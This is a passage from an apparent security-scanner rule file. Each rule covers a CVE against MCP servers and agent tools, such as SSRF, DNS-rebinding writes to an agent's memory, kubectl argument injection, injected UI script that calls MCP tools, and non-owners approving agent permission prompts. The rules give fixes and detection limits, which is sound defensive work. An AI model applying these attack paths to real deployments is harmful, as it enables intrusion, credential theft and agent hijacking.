# MCP tool-argument URL SSRF (CVE-2026-14748).
#
# The generic AAK-SSRF-001..005 family keys on request-object accessors
# (`args[...]` / `req.query` / `request.json`) and misses the canonical
# CVE-2026-14748 shape, where a bare tool-handler PARAMETER named `url` flows
# straight into `requests.get(url)`. This CVE-pinned rule closes that gap with
# an AST parameter->fetch taint path, mirroring how AAK-LANGCHAIN-SSRF-REDIR-001
# and AAK-LMDEPLOY-VL-SSRF-001 sit alongside the generic SSRF class.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-SSRF-001",
    "MCP tool handler fetches a caller-supplied URL without host/scheme allow-list",
    "An MCP tool handler passes an attacker-controllable URL argument "
    "(`url` / `endpoint` / `target` / `uri` and similar) straight into an "
    "outbound fetch (`requests` / `httpx` / `urllib` / `aiohttp`) without "
    "validating the host or scheme first, so a caller-supplied URL is fetched "
    "server-side and can reach loopback, private-range, or cloud-metadata "
    "endpoints (CWE-918, server-side request forgery). NVD, CVE-2026-14748: "
    "\"A flaw has been found in AIAnytime Awesome-MCP-Server ... the file "
    "mcp-wiki/src/mcp_wiki/server.py of the component mcp-wiki/wiki-summary. "
    "This manipulation of the argument url causes server-side request forgery. "
    "The attack may be initiated remotely. The exploit has been published.\" "
    "(CVSS 6.3 MEDIUM, https://nvd.nist.gov/vuln/detail/CVE-2026-14748).",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Deny by default: before fetching, parse the URL, require an https scheme, "
    "resolve the host, and reject anything not on an explicit host allow-list "
    "(also reject RFC 1918, 127.0.0.0/8, 169.254.0.0/16, ::1, fc00::/7). "
    "Disable automatic redirects or re-validate every hop, and pin the resolved "
    "IP for the actual request to defeat DNS rebinding.",
    sarif_name="McpToolArgUrlSsrf",
    cve_references=["CVE-2026-14748", "CVE-2026-104120"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reads only files that contain FastMCP, McpServer, modelcontextprotocol, "
        "createTool, `mcp.tool`, `@tool`, `@x.tool`, `.tool(`, `.registerTool`, `from "
        "mcp`, `import mcp` (each as whole words), `mcp.server` or `mcp_wiki` (any "
        "case). In Python, a parameter counts as a URL when its name is url, uri, "
        "endpoint, target, link, href, webhook or callback, with an optional plural "
        "`s` and one optional alphanumeric prefix joined by an underscore, in any case "
        "(`page_url`, `v2_url`), so `website` is not followed. The fetch has to be in "
        "the same function, so a handler that passes `url` to a helper which calls "
        "`requests.get` is missed, and any of `ALLOW_HOST(S)`, `ALLOWED_HOST(S)`, "
        "`allowlist`, `allow_list`, `urlparse`, `is_private`, `ip_address`, "
        "`ip_network`, `validate_url`, `is_safe_url`, `check_url`, `ssrf`, `deny`, "
        "`scheme [not] in`, `netloc [not] in`, `hostname [not] in` or "
        "`startswith(\"https` in the function, in any case, counts as validation, even "
        "when its result is only logged."
    ),
)


# ---------------------------------------------------------------------------
# Serena MCP toolkit unauthenticated-dashboard → RCE (CVE-2026-49471).
# Delivered as a dependency version-pin (fixed in serena-agent 1.5.2), mirroring
# the gateway-registry / Kong CVE pins, but the underlying weakness is CWE-306
# missing authentication (+ CWE-352 CSRF / DNS-rebinding) — same MCP_CONFIG
# no-auth class as AAK-AZURE-MCP-NOAUTH-001.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-SERENA-CVE-2026-49471-001",
    "Serena MCP toolkit < 1.5.2 (unauthenticated dashboard → DNS-rebinding RCE)",
    "The Serena MCP coding toolkit (`serena-agent`) before 1.5.2 ships a "
    "built-in web dashboard that \"exposes an unauthenticated Flask API on a "
    "fixed, predictable port, with no authentication, no CSRF protection, and "
    "no Host header validation. A DNS rebinding attack allows a malicious "
    "webpage to reach this API from any browser and write arbitrary content to "
    "the agent's persistent memory store, which the agent reads and acts on "
    "autonomously. Combined with execute_shell_command using shell=True, this "
    "creates a remote code execution chain requiring only that the victim visit "
    "a malicious webpage while Serena is running.\" (NVD, CVE-2026-49471, HIGH "
    "CVSS 8.3, CWE-306 + CWE-352, published 2026-07-07). A project depending on "
    "`serena-agent` below 1.5.2 (or unpinned, or launched from an unpinned "
    "`oraios/serena` / `serena-mcp-server` reference) is exposed. Fixed in 1.5.2.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Upgrade `serena-agent` to >= 1.5.2 and pin it explicitly. 1.5.2 binds the "
    "dashboard to loopback, adds a random per-session token, validates the Host "
    "header, and enforces CSRF — which together break the DNS-rebinding path. "
    "Do not expose the Serena dashboard on a routable interface, and keep "
    "`execute_shell_command` behind an explicit approval gate.",
    sarif_name="SerenaMcpUnauthDashboardRce",
    cve_references=["CVE-2026-49471"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Looks for `serena-agent`, `serena-mcp-server` or `oraios/serena`, unpinned or "
        "below 1.5.2, in the root dependency manifests and lockfiles and in the root "
        "`.mcp.json`, `mcp.json`, `claude_desktop_config.json` and `*.mcp.yaml` or "
        "`*.mcp.yml` files. Only these root-level files are read, so the same server "
        "launched from `.cursor/mcp.json` is missed."
    ),
)


# ---------------------------------------------------------------------------
# 2026-07 MCP/agent CVE disclosure wave — dependency version-pins.
#
# Eight vulnerable-dependency pins for MCP/agent CVEs disclosed 2026-07-08..12
# that ship a vendor fix and a pinnable PyPI / npm artifact. Detector:
# `mcp_cve_pins_2026_07`. Package names + fix floors verified against PyPI / npm
# before shipping. (Three sibling CVEs without a pinnable artifact or a tractable
# version scheme — aerostack-mcp SSRF, MaxKB stdio command-injection, langchain4j
# Maven — are dispositioned in CHANGELOG.cves.md rather than as pins.)
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-LITELLM-CVE-2026-59822-001",
    "LiteLLM < 1.84.0 (MCP auth bypass + skills-archive path traversal)",
    "LiteLLM before 1.84.0 has two MCP-relevant flaws: its MCP Streamable-HTTP "
    "endpoint let a fabricated Authorization header trigger an OAuth2 passthrough "
    "fallback that replaced failed key validation with an empty `UserAPIKeyAuth()`, "
    "reaching MCP tooling without a valid key (CVE-2026-59822); and its Skills "
    "archive extraction did not validate ZIP entry paths, allowing path traversal "
    "outside the staging directory (CVE-2026-59820, fixed 1.83.7-stable). Both are "
    "fixed by 1.84.0. A project pinning `litellm` below 1.84.0 (or unpinned) is "
    "exposed. (CVSS not yet scored by NVD; auth bypass to MCP tooling.)",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `litellm` to >= 1.84.0 and pin it. Ensure MCP routes require a valid "
    "LiteLLM key (no empty-auth fallback) and that skill/archive extraction "
    "validates entry paths against the destination directory.",
    sarif_name="LiteLLMMcpAuthBypass",
    cve_references=["CVE-2026-59822", "CVE-2026-59820"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `litellm` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`) or in a lockfile format the reader "
        "does not parse (`pdm.lock`). The `ghcr.io/berriai/litellm` image tag is not "
        "read, in a compose file or in an MCP config that starts it with `docker "
        "run`. A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-CLINE-CVE-2026-59723-001",
    "Cline < 3.0.30 (Hub dashboard WebSocket origin bypass → RCE)",
    "The Cline (`cline`) Hub dashboard server before 3.0.30 accepts WebSocket "
    "connections on `/browser` without validating the Origin header, and when "
    "`ROOM_SECRET` is unset on a local 127.0.0.1 bind, `isAuthorizedBrowserRequest()` "
    "lets an attacker-controlled website send `desktopCommand` frames that read "
    "workspace state, mutate MCP and provider settings, and trigger command "
    "execution once a provider/model is configured (CVE-2026-59723, CVSS 8.8). "
    "Fixed in 3.0.30.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `cline` to >= 3.0.30 and pin it. Do not run the Hub dashboard on an "
    "untrusted network; set `ROOM_SECRET` and require Origin validation on the "
    "dashboard WebSocket.",
    sarif_name="ClineHubDashboardOriginBypass",
    cve_references=["CVE-2026-59723"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `cline` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`) or in a lockfile format the reader "
        "does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile "
        "over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-TEXTEDITOR-CVE-2026-15138-001",
    "tumf mcp-text-editor path traversal (affected up to 1.0.2)",
    "The `mcp-text-editor` MCP server's `_validate_file_path` "
    "(`mcp_text_editor/text_editor.py`) mishandles a caller-supplied `file_path`, "
    "allowing remote path traversal (CVE-2026-15138, CVSS 6.3). NVD lists versions "
    "up to 1.0.2 as affected; the vendor closed the report without an explanation, "
    "so treat <= 1.0.2 (and unpinned) as exposed and move to the latest release.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp-text-editor` past 1.0.2 to the latest release and pin it; verify "
    "the traversal fix landed. Constrain the editor to an allow-listed root and "
    "reject `..` / absolute paths in `file_path`.",
    sarif_name="McpTextEditorPathTraversal",
    cve_references=["CVE-2026-15138"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SUPPLY-01"],
    limitations=(
        "Reads `mcp-text-editor` in requirements*.txt at any depth and, at the "
        "project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, "
        "uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking "
        "the lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse "
        "(`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-N8N-CVE-2026-59207-001",
    "n8n < 2.27.4 / 2.28.1 (MCP tool bypasses credential domain allow-list → SSRF/exfil)",
    "n8n before 2.27.4 (and the 2.28.x line before 2.28.1) did not enforce the "
    "\"Allowed HTTP Request Domains\" restriction on credentials when an AI-Agent "
    "MCP tool was pointed at an arbitrary URL, letting a member-level user with "
    "use-only access to a shared credential send its secret to an external server "
    "they control (CVE-2026-59207, CVSS 6.5). A project pinning `n8n` below 2.27.4 "
    "(or unpinned) is exposed; a 2.28.0 pin is also affected — move to 2.28.1.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `n8n` to >= 2.27.4 (or >= 2.28.1 on the 2.28 line) and pin it. Enforce "
    "the credential domain allow-list on MCP/HTTP tool destinations so a "
    "member-level user cannot redirect a shared credential to an external host.",
    sarif_name="N8nMcpCredentialDomainBypass",
    cve_references=["CVE-2026-59207"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reads `n8n` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`) or in a lockfile format the reader "
        "does not parse (a Yarn 2+ `yarn.lock`). A compose file's `n8nio/n8n` image "
        "tag is not read. A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-RUFLO-CVE-2026-59726-001",
    "ruflo < 3.16.3 (unauthenticated MCP bridge → tools/call RCE)",
    "The `ruflo` agent meta-harness before 3.16.3 shipped a default "
    "docker-compose deployment that exposed the MCP bridge `POST /mcp` and "
    "`POST /mcp/:group` endpoints with no authentication, letting an unauthenticated "
    "network attacker invoke `tools/call` for `terminal_execute`, obtain a shell in "
    "the bridge container, read provider API keys, and poison AgentDB learning-store "
    "patterns (CVE-2026-59726, CVSS 10 CRITICAL). Fixed in 3.16.3.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `ruflo` to >= 3.16.3 and pin it. Never expose the MCP bridge without "
    "authentication; bind it to loopback and require a token on `/mcp` routes.",
    sarif_name="RufloUnauthMcpBridgeRce",
    cve_references=["CVE-2026-59726"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `ruflo` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)

_r(
    "AAK-MCP-DEEPSEEK-CVE-2026-55604-001",
    "@arikusi/deepseek-mcp-server < 1.8.0 (unbound session IDs + unauth HTTP transport)",
    "`@arikusi/deepseek-mcp-server` from 1.4.2 up to (not including) 1.8.0 accepts "
    "caller-supplied `session_id` values in its process-global `SessionStore` "
    "without binding them to an authenticated principal, so an attacker can "
    "enumerate active sessions via `deepseek_sessions` and resume a victim's "
    "conversation via `deepseek_chat` (CVE-2026-55604, CVSS 8.6); its self-hosted "
    "HTTP transport also exposes `POST /mcp` with no `authProvider`, letting an "
    "unauthenticated client initialize a session and invoke tools that use the "
    "server-side `DEEPSEEK_API_KEY` (CVE-2026-55605, CVSS 5.3). Both fixed by 1.8.0.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `@arikusi/deepseek-mcp-server` to >= 1.8.0 and pin it. Bind session "
    "IDs to an authenticated principal / transport session, and configure an "
    "`authProvider` so `POST /mcp` is not reachable unauthenticated.",
    sarif_name="DeepseekMcpUnboundSession",
    cve_references=["CVE-2026-55604", "CVE-2026-55605"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025", "MCP10:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `@arikusi/deepseek-mcp-server` in requirements*.txt at any depth and, "
        "at the project root only, in pyproject.toml, Pipfile, package.json, "
        ".mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, "
        "poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock "
        "lockfiles, reporting a range that admits an affected version and a "
        "reference that states no version. The dependency is not read when it is "
        "declared in a sub-directory manifest (`packages/app/package.json`), in "
        "`.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the "
        "reader does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a "
        "lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-K8S-CVE-2026-61459-001",
    "mcp-server-kubernetes < 3.9.0 (argument injection → kubectl --server redirect)",
    "`mcp-server-kubernetes` before 3.9.0 has an argument-injection flaw in its "
    "structured tools (`kubectl_get`, `kubectl_describe`, `kubectl_delete`): "
    "`resourceType` / `name` parameters with leading dashes bypass the "
    "`assertNoDangerousFlags` check, so an attacker can inject `--server` to "
    "redirect kubectl at an attacker-controlled API server, exfiltrating the "
    "operator's bearer token and enabling full cluster compromise (CVE-2026-61459, "
    "CVSS 9.8 CRITICAL). Fixed in 3.9.0.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp-server-kubernetes` to >= 3.9.0 and pin it. Reject tool arguments "
    "beginning with `-` and pass a `--` end-of-options separator before "
    "caller-supplied values to any spawned `kubectl` command.",
    sarif_name="McpServerKubernetesArgInjection",
    cve_references=["CVE-2026-61459"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Reads `mcp-server-kubernetes` in requirements*.txt at any depth and, at the "
        "project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, "
        "uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking "
        "the lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). The `flux159/mcp-server-kubernetes` image tag is not "
        "read, in a compose file or in an MCP config that starts it with `docker "
        "run`. A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-ASTRBOT-CVE-2026-15501-001",
    "AstrBot MCP-test endpoint SSRF (affected up to 4.25.2)",
    "AstrBot's `ToolsRoute.test_mcp_connection` "
    "(`astrbot/dashboard/routes/tools.py`, MCP Test Endpoint) fetches a "
    "caller-supplied `mcp_server_config.url`, allowing remote server-side request "
    "forgery (CVE-2026-15501, CVSS 6.3). NVD lists versions up to 4.25.2 as "
    "affected and the vendor did not respond, so treat <= 4.25.2 (and unpinned) as "
    "exposed and move to the latest release.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `astrbot` past 4.25.2 to the latest release and pin it. Validate the "
    "MCP-test URL against an allow-list (scheme + host) and block private / "
    "loopback / metadata ranges before fetching.",
    sarif_name="AstrBotMcpTestSsrf",
    cve_references=["CVE-2026-15501"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reads `astrbot` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`) or in a lockfile format the reader "
        "does not parse (`pdm.lock`). The `soulter/astrbot` image tag is not read, "
        "in a compose file or in an MCP config that starts it with `docker run`. A "
        "file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

# --- 2026-07-13..15 MCP/agent CVE disclosure wave (pinnable artifacts) -------
# Package names + fix floors verified against PyPI / npm and, where available,
# NVD CPE version ranges before shipping. Non-pinnable siblings (mastergo-magic-mcp
# with no vendor fix, Grafana MCP on Go, mcp-gitlab with no NVD version data yet)
# are dispositioned in CHANGELOG.cves.md.

_r(
    "AAK-MCP-HEALTHLAKE-CVE-2026-15643-001",
    "AWS HealthLake MCP server pagination SSRF → credential exfil (< 0.0.14)",
    "`awslabs.healthlake-mcp-server` before 0.0.14 does not validate that "
    "pagination URLs derived from the `next_token` parameter point back to the "
    "expected HealthLake endpoint, so a remote authenticated caller can redirect "
    "subsequent requests to an attacker-controlled server and exfiltrate the AWS "
    "temporary security credentials the server attaches (CVE-2026-15643, CVSS 7.3, "
    "SSRF / CWE-918). Treat < 0.0.14 (and unpinned) as exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `awslabs.healthlake-mcp-server` to >= 0.0.14 and pin it. Validate that "
    "pagination / `next_token` URLs resolve to the configured HealthLake endpoint "
    "before following them.",
    sarif_name="HealthLakeMcpPaginationSsrf",
    cve_references=["CVE-2026-15643"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reads `awslabs.healthlake-mcp-server` in requirements*.txt at any depth "
        "and, at the project root only, in pyproject.toml, Pipfile, package.json, "
        ".mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, "
        "poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock "
        "lockfiles, taking the lowest version a range allows and reporting a "
        "reference that states no version. The dependency is not read when it is "
        "declared in a sub-directory manifest (`services/api/pyproject.toml`), in "
        "`.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the "
        "reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 "
        "MiB, is not read."
    ),
)

_r(
    "AAK-MCP-PRAISONAI-CVE-2026-61427-001",
    "PraisonAI MCP unauthenticated-default + path traversal (< 4.6.78)",
    "PraisonAI before 4.6.78 exposes the MCP HTTP-stream transport without "
    "authentication by default: `praisonai mcp serve --transport http-stream` "
    "defaults `--api-key` to None and only enforces Authorization/Bearer checks "
    "when a key is configured, so an unauthenticated client can initialize a "
    "session, enumerate tools (`tools/list`), and invoke them (`tools/call`); "
    "arguments are also forwarded without validating the advertised inputSchema "
    "(CVE-2026-61427, CVSS 7.3). The same pin also covers CVE-2026-47394 — an "
    "arbitrary-file-read path traversal via `workflow.show` (and the dispatcher's "
    "unvalidated `**kwargs` from `tools/call`), an incomplete prior path-handling "
    "fix that was fully closed only in 4.6.40. The same floor also covers "
    "CVE-2026-48168 (CVSS 10, fixed 4.6.40): a command injection in PraisonAI's "
    "bundled Claude GitHub Actions workflow that splices an attacker-controlled "
    "pull-request branch name into a Bash `run:` block, with any `@claude` comment "
    "able to trigger the job, so a fork PR reaches arbitrary execution in the "
    "Actions runner. The 4.6.78 floor is the highest of the three, so a project "
    "pinned below it is exposed to all of them. Default bind is 127.0.0.1, so "
    "remote reach needs a network bind. Treat < 4.6.78 (and unpinned) as exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `praisonai` to >= 4.6.78 and pin it. Always configure `--api-key` for "
    "the HTTP-stream transport and never bind it to a non-loopback interface "
    "without authentication.",
    sarif_name="PraisonAiMcpNoAuthDefault",
    cve_references=[
        "CVE-2026-61427", "CVE-2026-47394", "CVE-2026-48168",
        # 2026-08-26: three more advisories against praisonai, all fixed in
        # 4.6.58 -- below this rule's 4.6.78 floor, so every version they
        # affect already fires. Recorded here rather than given their own
        # pins: two pins on one package report one dependency twice.
        "CVE-2026-55532", "CVE-2026-55529", "CVE-2026-55531",
        # 2026-09-14: CVE-2026-57124 (CRITICAL 9.8). POST /api/mcp/connect is
        # unauthenticated, caller-controlled `command`/`args` reach
        # StdioMCPClient, and the UI binds 0.0.0.0 -- this rule's own shape.
        # Fixed 4.6.59, below the 4.6.78 floor, so again no pin of its own.
        "CVE-2026-57124",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `praisonai` in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock and uv.lock "
        "lockfiles, taking the lowest version a range allows and reporting a "
        "reference that states no version. The dependency is not read when it is "
        "declared in a sub-directory manifest (`services/api/pyproject.toml`) or in "
        "a lockfile format the reader does not parse (`pdm.lock`). A file over 2 MB, "
        "or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-APPIUM-CVE-2026-58500-001",
    "MCP Appium locator-UI HTML/JS injection → unauthorized tool exec (< 1.85.10)",
    "`appium-mcp` (MCP Appium) before 1.85.10 interpolates attacker-controlled "
    "element attributes (text, content-desc, resource-id, locator selectors) into "
    "an HTML template literal in `createLocatorGeneratorUI` with no HTML/JS "
    "escaping. An attacker who controls the app-under-test UI can inject script "
    "into the MCP UI resource returned by `generate_locators`; when the victim's "
    "MCP client renders it, the script invokes arbitrary MCP tools via "
    "`window.parent.postMessage` (CVE-2026-58500, CVSS 8.2). Treat < 1.85.10 (and "
    "unpinned) as exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `appium-mcp` to >= 1.85.10 and pin it. Context-escape all element "
    "attributes before interpolating them into UI-resource HTML.",
    sarif_name="AppiumMcpLocatorUiInjection",
    cve_references=["CVE-2026-58500"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Reads `appium-mcp` in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)

_r(
    "AAK-MCP-PENPOT-CVE-2026-45805-001",
    "Penpot MCP ReplServer unauthenticated /execute RCE (< 2.15.0)",
    "`@penpot/mcp` before 2.15.0 binds its ReplServer to `0.0.0.0:4403` and "
    "exposes an unauthenticated `/execute` endpoint that passes the `code` field "
    "to `PluginBridge.executePluginTask()`, letting anyone on the network execute "
    "arbitrary JavaScript on the server (CVE-2026-45805, CVSS 8.8). Treat < 2.15.0 "
    "(and unpinned) as exposed.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `@penpot/mcp` to >= 2.15.0 and pin it. Never expose a REPL / eval "
    "endpoint unauthenticated; bind debugging servers to loopback only.",
    sarif_name="PenpotMcpReplRce",
    cve_references=["CVE-2026-45805"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `@penpot/mcp` in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)

_r(
    "AAK-MCP-OPENCLAW-CVE-2026-62195-001",
    "OpenClaw MCP authorization bypasses (below 2026.7.1)",
    "OpenClaw 2026.5.20 up to (but not including) 2026.6.6 contains an "
    "authorization-bypass in the MCP loopback feature that lets lower-trust "
    "callers execute owner-only tools by routing through configured input paths, "
    "so an attacker can execute or persist actions beyond their intended "
    "permissions (CVE-2026-62195, CVSS 8.3; NVD range `2026.5.20` <= v < "
    "`2026.6.6`). The same pin also covers CVE-2026-62208 (Authorization headers "
    "forwarded during MCP SSE redirects, fixed in 2026.6.5). Before 2026.7.1, "
    "owner-only authorization is also not enforced for Claude Code permission "
    "prompts delivered through the MCP channel bridge: a non-owner channel sender "
    "with channel command access can approve or deny a pending permission request "
    "meant for the owner, so the requested action proceeds without owner consent "
    "(CVE-2026-100585, CVSS 8.0, CWE-862; GHSA-p5g8-m35v-7m82 scopes it `< "
    "2026.7.1` with no lower bound). Before 2026.7.1 a non-owner channel sender "
    "can also run the Codex computer-use install command, and so install plugins "
    "and start MCP processes with OpenClaw's privileges (CVE-2026-100587, CVSS 8.8, "
    "CWE-862, GHSA-pjjr-5qhr-5w6r). The same sender can persist a stdio MCP command "
    "through `/mcp set` or `/mcp unset` that runs with OpenClaw's privileges when the "
    "configuration loads (CVE-2026-100596, CVSS 8.8, CWE-862, GHSA-wwx7-573h-pqwc). "
    "Treat every release below 2026.7.1 (and unpinned) as exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `openclaw` to >= 2026.7.1 and pin it. Enforce the caller's trust tier "
    "on every MCP loopback tool invocation, not just at the transport edge, and "
    "accept a permission reply only from the owner the prompt was addressed to.",
    sarif_name="OpenClawMcpLoopbackAuthzBypass",
    cve_references=[
        "CVE-2026-62195", "CVE-2026-62208", "CVE-2026-100585",
        "CVE-2026-100587", "CVE-2026-100596",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads the npm package `openclaw` at the project root, in package.json, "
